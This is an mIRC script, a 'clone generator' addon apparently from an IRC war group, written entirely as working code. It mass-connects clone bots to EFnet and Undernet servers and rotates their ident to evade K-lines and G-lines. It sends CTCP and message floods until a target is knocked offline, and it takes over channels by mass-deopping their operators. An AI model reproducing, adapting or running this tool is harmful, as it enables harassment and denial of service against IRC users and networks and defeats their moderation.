; Clone generator (version 1.3) - Addon for mIRC 
; Send bugs and stuff to drittsekk@sinnsyk.org
; This is the first english version! (I AM A VERY TERRIBLE ENGLISH SPEAKING INDIVIDUAL!)

; To load: /load -rs wclones.mrc
; The variable %cloneversion is telling which version this
; script is currently running.
; %dickhead is the identd of your clones (default: "idx")
; try to change %dickhead (/set %dickhead mynewcloneid) when your 
; clones are k-lined or g-lined from a server/network.

; I recommend use of the command /netwclone when you have to make
; network clones. /netwclone is reading from mIRCs server.ini file and 
; connects to all servers in the specified network. Type: /netwclone mynetwork
; For example: /netwclone undernet

; Undernet War Alliance   -    http://war-alliance.sinnsyk.org
;-------------------------------------------------------------------------------

alias netwclone { /lagclonevindu
  /if ($1- == $null) { /echo -a $chr(3) $+ 3*** $chr(3) $+ $chr(3) $+ 11,1/netwclone $chr(3) $+ 4<network> | /halt }
  /if ($exists(servers.ini) == $false) { /echo -a $chr(3) $+ 2*** you need the file servers.ini in same directory as $mircdir | /halt }
  /set %nett.nettverk $1-
  /set %tall 0 | :startfinn1 | /inc %tall | /if (%tall > $lines(servers.ini)) { /halt }
  /if ($read -l $+ %tall servers.ini == $chr(91) $+ servers $+ $chr(93)) { /goto startfinn2 }
  /goto startfinn1 | :startfinn2
  /inc %tall | /if (%tall > $lines(servers.ini)) { /echo -a $chr(3) $+ 3*** connected to all servers on $chr(31) $+ $chr(3) $+ 11,1 $+ $1- $+ $chr(3) $+ $chr(31) $+ $chr(3) $+ 3 successfully. | /halt } 
  /set %linje $read -l $+ %tall servers.ini
  /if ($count(%linje,=) == 1) { 
    /if ($lower($mid(%linje,$calc($pos(%linje,=,1)+1),$len($1-))) == $1-) {
      /set %nett.server $mid(%linje,$calc($pos(%linje,:,2)+1),$calc($pos(%linje,:,3) - $pos(%linje,:,2)-1))
      /set %nett.port $mid(%linje,$calc($pos(%linje,:,3)+1),4)
      /echo @clones $chr(3) $+ 2*** connecting to %nett.server port %nett.port ( $+ %nett.nettverk $+ )
      /lagclonekobling %nett.server %nett.port
  } }
  /goto startfinn2
}
on 1:load:/if ($exists(servers.ini) == $false) { /echo -a $chr(3) $+ 4*** IMPORTANT: servers.ini is giving you much more out of this script. }
on 1:start:/set %dickhead idx | /echo -a $chr(3) $+ 31loading addons.. | /set %clonescript yes | /set %cloneversion 1.3 | /set %cloneteller 0 | /set %vismelding på
alias lagclone { /if ($1 == $null) { /halt } | /lagclonevindu 
/lagclonekobling $1 $2 }
alias efnet-cloning { /lagclonevindu
  /lagclonekobling efnet.telstra.net.au 6665
  /lagclonekobling efnet.matrix.com.br 6667
  /lagclonekobling irc.powersurfr.com 6667
  /lagclonekobling irc.magic.ca 6667
  /lagclonekobling irc.nbnet.nb.ca 6667
  /lagclonekobling irc.idirect.ca 6667
  /lagclonekobling irc.total.net 6667
  /lagclonekobling efnet.cs.hut.fi 6667
  /lagclonekobling irc.isdnet.fr 6667
  /lagclonekobling irc.nijenrode.nl 6667
  /lagclonekobling irc2.homelien.no 6667
  /lagclonekobling irc.homelien.no 6667
  /lagclonekoblingefnet.telia.no 6667
  /lagclonekobling irc.df.lth.se 6666
/lagclonekobling irc.mcs.net 6667 }
alias undernet-cloning { /lagclonevindu 
  /lagclonekobling Flanders.Be.Eu.Undernet.org 6667
  /lagclonekobling Amsterdam.NL.Eu.UnderNet.org 6667
  /lagclonekobling Oslo1.NO.EU.Undernet.org 6667
  /lagclonekobling Oslo1.NO.EU.Undernet.org 6667
  /lagclonekobling Flanders.Be.Eu.Undernet.org 6667
  /lagclonekobling Caen.Fr.Eu.UnderNet.org 6667
  /lagclonekobling Flanders.Be.Eu.Undernet.org 6667
  /lagclonekobling Flanders.Be.Eu.Undernet.org 6667
  /lagclonekobling atlanta.ga.us.undernet.org 6667
  /lagclonekobling atlanta.ga.us.undernet.org 6667
  /lagclonekobling graz.at.Eu.UnderNet.org 6667
  /lagclonekobling graz.at.Eu.UnderNet.org 6667
  /lagclonekobling dallas.tx.us.undernet.org 6668
  /lagclonekobling plano.tx.us.undernet.org 6667
  /lagclonekobling graz.at.Eu.UnderNet.org 6668
  /lagclonekobling arlington.va.us.undernet.org 6667
  /lagclonekobling lasvegas.nv.us.undernet.org 6667
  /lagclonekobling newbrunswick.nj.us.undernet.org 6662
  /lagclonekobling ann-arbor.mi.us.undernet.org 6667
/lagclonekobling baltimore.md.us.undernet.org 6667 }
alias powerful_cloning { /if ($1- == $null) || ($exists(servers.ini) == $false) { /halt }
/timer 5 0 /netwclone $1- }
on 1:sockopen:uclone*:{ /if ($sockerr) { /halt } 
  /set %clonenavn $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  /sockwrite -n $sockname NICK %clonenavn
  /sockwrite -n $sockname USER %dickhead powkerwer pewokrwr : $+ $chr(3) $+ 11,1UWA
/aline @clones $sockname $+ : User info sent....... }
on 1:sockread:uclone*:{ /sockread %melding | /if (%melding == $null) { /halt }
  /set %numrep $mid(%melding,$calc($pos(%melding,$chr(32),1)+1),512) 
  /if (%vismelding) { /echo @clones %melding }
  /if ($left(%melding,4) == PING) { /sockwrite -n $sockname PONG $mid(%numrep,2,512) }
  /if ($left(%numrep,3) == 451) { /sockwrite -n $sockname USER wporewpokr pokwerwpo wpoekrwke :woeirjoiewr }
  /if ($left(%numrep,3) == 376) { /set %clonenavn $mid(%numrep,$calc($pos(%numrep,$chr(32),1)+1),$calc($pos(%numrep,:,1) - $calc($pos(%numrep,$chr(32),1)+1)))
    /set %clonenummer $mid($sockname,$calc($pos($sockname,_,1)+1),500) | /window -l @clonenames | /aline @clonenames %clonenavn $+ : $+ %clonenummer
  /echo -a $chr(3) $+ 3*** clone %clonenavn ( $+ %clonenummer $+ ) er klar. | /sockwrite -n $sockname MODE %clonenavn +i }
  /if (%vismelding) { /if ($lower($left(%numrep,$len(privmsg))) == privmsg) { /aline @clones $chr(3) $+ 11,1 $+ $chr(31) $+ $mid(%melding,$calc($pos(%melding,!,1)+1),$calc($pos(%melding,$chr(32),1)-$pos(%melding,!,1)-1)) $+ $chr(31) ------> $+ $chr(3)     < $+ $mid(%melding,2,$calc($pos(%melding,!,1)-2)) $+ > $mid(%melding,$calc($pos(%melding,:,2)+1),512) } }
  /if ($lower($left(%numrep,4)) == quit) { /if ($mid(%melding,2,$calc($pos(%melding,!,1)-2)) == %ctcpoffer) { /echo -a $chr(3) $+ 3*** $chr(31) $+ Fulltreff: $+ $chr(31) %ctcpoffer ble eliminert suksessfullt av clonene. | /timers off | /unset %ctcpoffer } } 
  ; :drittsekk!dust@127.0.0.1 MODE #kola +o sengehest    
  /if ($lower($left(%numrep,4)) == mode) { /unset %clonefunnet | /finnclonenavn $mid(%numrep,$calc($pos(%numrep,$chr(32),3)+1),20) | /if (%clonefunnet) && ($mid(%numrep,$calc($pos(%numrep,$chr(32),2)+1),2) == -o) { /sockwrite -n $sockname mode $mid(%numrep,$calc($pos(%numrep,$chr(32),1)+1),$calc($pos(%numrep,$chr(32),2)-$pos(%numrep,$chr(32),1))) -o $mid(%melding,2,$calc($pos(%melding,!,1)-2)) | /sockwrite -n $sockname mode $mid(%numrep,$calc($pos(%numrep,$chr(32),1)+1),$calc($pos(%numrep,$chr(32),2)-$pos(%numrep,$chr(32),1))) +o $mid(%numrep,$calc($pos(%numrep,$chr(32),3)+1),20) } }
  /if ($lower($left(%numrep,4)) == nick) { /set %skiftenavn $mid(%melding,2,$calc($pos(%melding,!,1)+1-3)) 
    /if (%skiftenavn == %ctcpoffer) { /set %ctcpoffer %skiftenavn | /echo -a $chr(3) $+ 3*** target changed to %ctcpoffer ( $+ $sockname $+ ) | /halt }
/finnclonenavn %skiftenavn | /if (%clonefunnet) { /dline @clonenames %tall | /aline @clonenames $mid(%melding,$calc($pos(%melding,:,2)+1),15) $+ : $+ %clonenummer } } }
on 1:sockclose:uclone*:{ /echo @clones Clone number $+ $mid($sockname,$calc($pos($sockname,_,1)+1),500) disconnected.
  /set %tall 0 | :lesavliste | /inc %tall | /if (%tall > $line(@clonenames,0)) { /halt } | /if (%tall > 100) { /halt }
  /if ($mid($sockname,$calc($pos($sockname,_,1)+1),500) == $mid($line(@clonenames,%tall),$calc($pos($line(@clonenames,%tall),:,1)+1),20)) { /dline @clonenames %tall | /halt }
/goto lesavliste }
alias clones.sendallctcp { /if ($1 == $null) { /halt }
  /sockwrite -n uclone* PRIVMSG $1 : $+ $chr(1) $+ PING $+ $chr(1)
  /sockwrite -n uclone* PRIVMSG $1 : $+ $chr(1) $+ VERSION $+ $chr(1)
  /sockwrite -n uclone* PRIVMSG $1 : $+ $chr(1) $+ CLIENTINFO $+ $chr(1)
  /sockwrite -n uclone* PRIVMSG $1 : $+ $chr(1) $+ USERINFO $+ $chr(1)
/sockwrite -n uclone* PRIVMSG $1 : $+ $chr(1) $+ TIME $+ $chr(1) }
alias clones.blandetflood /timer 1000 3 /clones.sendallctcp $1 | /set %ctcpoffer $1
alias clones.quit /sockwrite -n uclone* quit : $+ $1-
alias clones.join /sockwrite -n uclone* join $1
alias clones.part /sockwrite -n uclone* part $1
alias clones.meldingflood /sockwrite -n uclone* PRIVMSG $1 : $+ $2-
alias clones.pingflood /timer 1000 2 /sockwrite -n uclone* PRIVMSG $1 : $+ $chr(1) $+ PING $+ $chr(1) | /set %ctcpoffer $1
alias clones.verflood /timer 1000 2 /sockwrite -n uclone* PRIVMSG $1 : $+ $chr(1) $+ VERSION $+ $chr(1) | /set %ctcpoffer $1
alias clones.command /sockwrite -n uclone* $1-
alias clones.timeflood /timer 1000 2 /sockwrite -n uclone* PRIVMSG $1 : $+ $chr(1) $+ TIME $+ $chr(1) | /set %ctcpoffer $1
alias clones.mass_slap /sockwrite -n uclone* PRIVMSG $chan : $+ $chr(1) $+ ACTION slaps $$1 around a bit with a large trout $+ $chr(1)
alias clones.meg /sockwrite -n uclone* PRIVMSG $chan : $+ $chr(1) $+ ACTION $1- $+ $chr(1)
alias clones.clientinfo_flood /timer 1000 2 /sockwrite -n uclone* PRIVMSG $$1 : $+ $chr(1) $+ CLIENTINFO $+ $chr(1)
alias clones.gethere /clones.join $chan
alias clone.quit /sockwrite -n uclone_ $+ $$1 QUIT : $+ $2-
alias clone.melding /sockwrite -n uclone_ $+ $$1 PRIVMSG $$2 : $+ $$3-
alias clone.name /sockwrite -n uclone_ $+ $$1 NICK $$2
alias clone.command /sockwrite -n uclone_ $+ $$1 $$2-


menu @clones {
  Show server messages:/set %vismelding på
  Do not show server messages:/unset %vismelding
}
on 1:quit:/if ($nick == %ctcpoffer) { /echo -a $chr(3) $+ 3*** Target eliminated $chr(2) $+ ( $+ $nick $+ ) | /unset %ctcpoffer }
alias lagclonevindu { /window -k0 @clones | /titlebar @clones                                            -=CLONE GENERATOR (v $+ %cloneversion $+ )=-
/if ($exists(c:\windows\86wall2.bmp) == $true) { /background @clones c:\windows\86wall2.bmp } }
alias lagclonekobling { /if ($1 == $null) || ($2 == $null) { /return }
/inc %cloneteller | /sockopen uclone_ $+ %cloneteller $1 $2 }
menu @clonenames {
  lbclick:/echo -s $chr(3) $+ 4,1+++ $+ $chr(3) $+ $chr(3) $+ 11,1 $chr(2) $+ F3: $+ $chr(2) Send message to nick, $chr(2) $+ F4: $+ $chr(2) Send command to server (through clone $mid($line(@clonenames,$1),$calc($pos($line(@clonenames,$1),:,1)+1),20) $+ ) | /set %sisteclone $mid($line(@clonenames,$1),$calc($pos($line(@clonenames,$1),:,1)+1),20)
}
alias f3 { /if ($1 == $null) { /set %sendenavn $?="Nickname to recieve your message:" } | /else { /set %sendenavn $1 }
  /if ($2 == $null) { /set %clonemelding $?="Message to send:" } | /else { /set %clonemelding $2 }
/sockwrite -n uclone_ $+ %sisteclone PRIVMSG %sendenavn : $+ %clonemelding }
alias f4 { /if ($1- == $null) { /set %clonemelding $?="command:" } | /else { /set %clonemelding $1- }
/sockwrite -n uclone_ $+ %sisteclone %clonemelding }
alias finnclonenavn { /if ($1 == $null) { /halt } | /set %tall 0
  :letstart | /inc %tall | /if (%tall > $line(@clonenames,0)) { /unset %clonefunnet | /return }
  /if ($left($line(@clonenames,%tall),$len($1)) == $1) { /set %clonenummer $mid($line(@clonenames,%tall),$calc($pos($line(@clonenames,%tall),:,1)+1),20) | /set %clonefunnet $1 | /set %clonelinje %tall | /return }
/goto letstart }

alias personal.takeover { /set %teller 0
  :startdeop | /inc %teller | /if ($opnick($chan,0) < %teller) { /echo -a $chr(3) $+ *** Takeover (personal) completed. | /return }
  /unset %clonefunnet | /finnclonenavn $opnick($chan,%teller) | /if (%clonefunnet) { /goto startdeop }
/if ($opnick($chan,%teller) == $me) { /goto startdeop } | /mode $chan -o $opnick($chan,%teller) }
alias clones.takeover {
  /set %teller 0 | /set %kteller 0 | :taloop | /inc %kteller | /inc %teller
  /if (%kteller > $line(@clonenames,0)) { /set %kteller 0 | /goto taloop }
  /if (%teller > $opnick($chan,0)) { /echo -a $chr(3) $+ *** Takeover (with clones) completed. | /return }
  /if ($opnick($chan,%teller) == $me) { /goto taloop }
  /unset %clonefunnet
  /finnclonenavn $opnick($chan,%teller) | /if (%clonefunnet) { /goto taloop }
  /sockwrite -n uclone_ $+ $mid($line(@clonenames,%kteller),$calc($pos($line(@clonenames,%kteller),:,1)+1),30) mode $chan -o $opnick($chan,%teller)
/goto taloop }
alias clones.complete_takeover { /if ($me isop $chan) {
    /clones.join $chan | /set %teller 0
    :loop2 | /inc %teller | /if (%teller > $line(@clonenames,0)) { /timer 1 4 /clones.takeover | /personal.takeover | /return }
    /mode $chan +o $left($line(@clonenames,%teller),$calc($pos($line(@clonenames,%teller),:,1)-1))
/goto loop2 } }
alias clones.newnames { /set %tall 0 | :navngi | /inc %tall
  /if (%tall > $line(@clonenames,0)) { /return }
  /sockwrite -n uclone_ $+ $mid($line(@clonenames,%tall),$calc($pos($line(@clonenames,%tall),:,1)+1),30) NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
/goto navngi }
alias clones.takeover2 { /set %teller 0 | /set %kteller 0
  :loop3 | /inc %teller | /if ($opnick($chan,0) < %teller) { /inc %kteller | /unset %teller | /if (%kteller > $line(@clonenames,0)) { /echo -a $chr(3) $+ 3*** Takeover (with clones) completed. | /return } 
  /goto loop3 } | /if ($opnick($chan,%teller) == $me) { /goto loop3 }
  /unset %clonefunnet | /finnclonenavn $opnick($chan,%teller) | /if (%clonefunnet) { /goto loop3 }
  /sockwrite -n uclone_ $+ $mid($line(@clonenames,%kteller),$calc($pos($line(@clonenames,%kteller),:,1)+1),30) mode $chan -o $opnick($chan,%teller)
/goto loop3 }
